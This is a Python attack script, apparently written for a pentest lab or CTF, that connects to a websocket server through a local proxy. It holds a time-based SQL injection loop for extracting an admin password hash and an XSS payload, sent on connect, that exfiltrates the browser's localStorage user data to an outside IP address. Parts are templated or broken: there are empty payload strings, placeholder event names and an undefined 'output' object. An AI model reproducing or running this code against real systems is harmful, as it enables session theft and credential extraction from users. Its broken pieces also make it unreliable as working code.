#!/usr/bin/python3
import requests
import json
import socketio
import socket
import logging
class ProxySession(requests.Session):
    def __init__(self):
        super().__init__()
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }

sio = socketio.Client(http_session=ProxySession(), logger=True, engineio_logger=True)
def send_websocket_message():
    global correct_condition

    # Send the 'postRegister' event after connecting creating account
    #sio.emit()
    print("Registration data sent")

    print("[!] Script started Time-Based SQL Injection!")
    charsetBase64 = "1234567890" + "abcdefghijklmnopqrstuvwxyz" + "abcdefghijklmnopqrstuvwxyz".upper() + "=/+"
    result_hash = ""
    length_hash = 1
    while True:
        for char in charsetBase64:
            payload = f""
            sio.emit('<funciton>', {'':'','': payload})
            sio.sleep(2)  # Adjust this time as needed based on response time
            if correct_condition:
                result_hash += char
                print("[!] Progress of password: {}".format(result_hash), end="\r")
                break
            if char == "+":
                print("\n[+] Finished!")
                output.success("[+] Admin password/hash: {}".format(result_hash))
                return result_hash
        length_hash += 1

@sio.on('emailFound')  # The event name that is returned from the server
def on_email_found(data):
    global correct_condition
    logging.info(f"Received response: {data}")

    if data == True:
        correct_condition = True
        print(correct_condition)

    else:
        correct_condition = False
        print(correct_condition)

#@sio.on("newChatMessage")
def xxs():
    sio.emit('m', {"":"","":'<img src=x onerror=this.src="http://192.168.45.236/?c="+localStorage.getItem("user")>',"":""})
    print("f")


@sio.event
def connect():
    print("Connected to the server")
    #send_websocket_message()
    xxs()

@sio.event
def disconnect():
    logging.info("Disconnected from the server")

sio.connect("http://<url>", transports=['websocket', 'polling'])
try:
   sio.wait()
   print("Connection successful!")
except KeyboardInterrupt:
    logging.info("Exiting...")
finally:
    sio.disconnect()
